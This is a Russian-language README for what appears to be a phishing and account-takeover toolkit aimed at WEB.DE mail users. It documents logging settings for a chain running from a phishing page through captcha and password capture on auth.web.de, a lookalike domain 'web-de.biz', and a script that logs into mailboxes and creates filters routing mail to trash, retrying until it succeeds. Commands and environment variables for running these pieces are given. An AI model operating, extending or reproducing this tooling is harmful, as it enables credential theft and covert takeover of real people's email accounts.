# Логи терминала (краткий режим)

По умолчанию **WEB.DE автовход** и **Python `lead_simulation_api.py`** пишут короткие строки (цепочка: фишинг → auth.web.de → капча → пароль → результат).

## Переменные окружения

| Переменная | Где | Назначение |
|------------|-----|------------|
| `WEBDE_VERBOSE_LOG=1` | Python (`webde_login.py`, `lead_simulation_api.py`) | Полные шаги: ДИАГНО, consent, снимки страниц, детали капчи, `==========` START/END, длинные API-строки. |
| `SERVER_LOG_PHISH_LABEL` | Node (`server.js`) | Текст «потока» в `[ВХОД]` вместо домена по умолчанию. Если не задано — используется `WEBDE_DOMAIN` (например `web-de.biz`). |

Пример полного лога на сервере:

```bash
WEBDE_VERBOSE_LOG=1 pm2 restart gmx-net
```

## Локальный тест «вход + фильтр в корзину»

Скрипт `login/test_mail_filters_local.py` — видимый браузер, `KEEP_BROWSER_OPEN=1`, шаги фильтра логируются как `[FILTERS]`.

| Переменная | Назначение |
|------------|------------|
| `WEBDE_FILTERS_DEV_LOOP=1` | По умолчанию для этого скрипта: после прогона фильтров можно **снова запустить только фильтры** в том же окне (без нового логина). В терминале: `Enter` — повтор; `r` / `reload` — перезагрузить `webde_mail_filters.py` с диска; `q` — выйти из цикла. |
| `WEBDE_FILTERS_DEV_LOOP=0` | Один прогон фильтров, как раньше. |
| `WEBDE_FILTERS_RETRY_UNTIL_SUCCESS=1` | Вместе с `WEBDE_FILTERS_DEV_LOOP=0`: **автоматически** повторять сценарий фильтров в том же браузере, пока не завершится без ошибки (в логе `=== фильтр: готово ===`). `WEBDE_VERBOSE_LOG=1` принудительно включается для этого режима. Лимит: `WEBDE_FILTERS_MAX_ATTEMPTS` (пусто = 200; `0` = без лимита). |
| `WEBDE_FILTERS_RELOAD_ON_RETRY=1` | По умолчанию при `RETRY_UNTIL_SUCCESS`: перед следующей попыткой вызывается `importlib.reload(webde_mail_filters)` — правки в `webde_mail_filters.py` подхватываются без перезапуска Python. `=0` — отключить. |
| `WEBDE_FILTERS_SCREENSHOTS=1` | По умолчанию: при ошибках и долгом ожидании модалки пишутся PNG в `login/debug_filters/` + в лог `STATE[…]` (url, title, frame URLs, фрагмент body). `=0` — без скринов. |
| `WEBDE_FILTERS_SCREENSHOT_MILESTONES=1` | Доп. снимки на шагах (mail_settings, после Filterregeln, после клика «erstellen», открыта модалка). |

```bash
cd login
export WEBDE_TEST_EMAIL='user@web.de'
export WEBDE_TEST_PASSWORD='…'
export WEBDE_VERBOSE_LOG=1 KEEP_BROWSER_OPEN=1 HEADLESS=0
python3 test_mail_filters_local.py
```

Пароль не храните в git; после теста смените пароль, если он светился в чате/логах.
